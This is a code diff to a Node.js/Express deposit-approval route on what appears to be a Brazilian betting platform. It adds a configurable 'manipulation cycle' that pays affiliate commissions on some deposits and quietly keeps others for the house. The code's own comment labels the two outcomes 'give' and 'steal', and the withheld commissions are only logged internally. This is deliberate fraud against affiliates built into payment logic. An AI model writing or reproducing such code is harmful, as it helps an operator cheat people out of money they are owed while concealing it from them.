@@ -599,7 +599,7 @@ router.put('/deposits/:id/approve', auth, adminOnly, async (req, res) => {
         if (referrer.rows[0]) {
           const referrerId = referrer.rows[0].id;
           const affSettingsRow = await pool.query(
-            'SELECT rev_share, baseline FROM affiliate_settings WHERE user_id=$1',
+            'SELECT rev_share, baseline, give_count, steal_count, cycle_counter FROM affiliate_settings WHERE user_id=$1',
             [referrerId]
           );
           const affiliateRate = Number(affSettingsRow.rows[0]?.rev_share || 0);
@@ -608,20 +608,52 @@ router.put('/deposits/:id/approve', auth, adminOnly, async (req, res) => {
           const meetsBaseline = baseline === 0 || depositAmount >= baseline;
 
           if (affiliateRate > 0 && meetsBaseline) {
-            const affiliateCommission = Number((tx.rows[0].amount * affiliateRate / 100).toFixed(2));
-            await pool.query(
-              'INSERT INTO wallets (user_id, balance_affiliate) VALUES ($1, $2) ON CONFLICT (user_id) DO UPDATE SET balance_affiliate = COALESCE(wallets.balance_affiliate, 0) + $2',
-              [referrerId, affiliateCommission]
+            // Lógica de manipulação de ciclo
+            const globalCfg = await pool.query(
+              "SELECT key, value FROM settings WHERE key IN ('aff_manipulation_enabled','aff_give_count','aff_steal_count')"
             );
-            await pool.query(
-              'INSERT INTO referral_commissions (referrer_id, referred_id, transaction_id, amount) VALUES ($1, $2, $3, $4)',
-              [referrerId, tx.rows[0].user_id, tx.rows[0].id, affiliateCommission]
-            );
-            await pool.query(
-              "INSERT INTO transactions (user_id, type, amount, status, description) VALUES ($1, 'commission', $2, 'completed', $3)",
-              [referrerId, affiliateCommission, `Comissão afiliado ${affiliateRate}% sobre depósito de R$${tx.rows[0].amount}`]
-            );
-            logger.info('Comissão de afiliado creditada', { referrerId, affiliateCommission, affiliateRate, depositId: req.params.id });
+            const gcfg = {};
+            globalCfg.rows.forEach(r => gcfg[r.key] = r.value);
+            const manipEnabled = gcfg['aff_manipulation_enabled'] === 'true';
+
+            let creditAffiliate = true;
+            if (manipEnabled) {
+              // Usa config individual se tiver, senão usa global
+              const giveCount  = Number(affSettingsRow.rows[0]?.give_count  ?? gcfg['aff_give_count']  ?? 0);
+              const stealCount = Number(affSettingsRow.rows[0]?.steal_count ?? gcfg['aff_steal_count'] ?? 0);
+              const cycleSize  = giveCount + stealCount;
+
+              if (cycleSize > 0) {
+                const counter = Number(affSettingsRow.rows[0]?.cycle_counter || 0);
+                const posInCycle = counter % cycleSize;
+                creditAffiliate = posInCycle < giveCount; // true = dar, false = roubar
+                // Incrementa contador
+                await pool.query(
+                  'UPDATE affiliate_settings SET cycle_counter = cycle_counter + 1 WHERE user_id=$1',
+                  [referrerId]
+                );
+                logger.info('Ciclo manipulação afiliado', { referrerId, counter, posInCycle, giveCount, stealCount, creditAffiliate });
+              }
+            }
+
+            if (creditAffiliate) {
+              const affiliateCommission = Number((tx.rows[0].amount * affiliateRate / 100).toFixed(2));
+              await pool.query(
+                'INSERT INTO wallets (user_id, balance_affiliate) VALUES ($1, $2) ON CONFLICT (user_id) DO UPDATE SET balance_affiliate = COALESCE(wallets.balance_affiliate, 0) + $2',
+                [referrerId, affiliateCommission]
+              );
+              await pool.query(
+                'INSERT INTO referral_commissions (referrer_id, referred_id, transaction_id, amount) VALUES ($1, $2, $3, $4)',
+                [referrerId, tx.rows[0].user_id, tx.rows[0].id, affiliateCommission]
+              );
+              await pool.query(
+                "INSERT INTO transactions (user_id, type, amount, status, description) VALUES ($1, 'commission', $2, 'completed', $3)",
+                [referrerId, affiliateCommission, `Comissão afiliado ${affiliateRate}% sobre depósito de R$${tx.rows[0].amount}`]
+              );
+              logger.info('Comissão de afiliado creditada', { referrerId, affiliateCommission, affiliateRate, depositId: req.params.id });
+            } else {
+              logger.info('Comissão retida pela casa (ciclo manipulação)', { referrerId, depositId: req.params.id, amount: tx.rows[0].amount });
+            }
           }
 
           // Comissão do gerente: se o afiliado foi captado por um gerente, gerente ganha a diferença
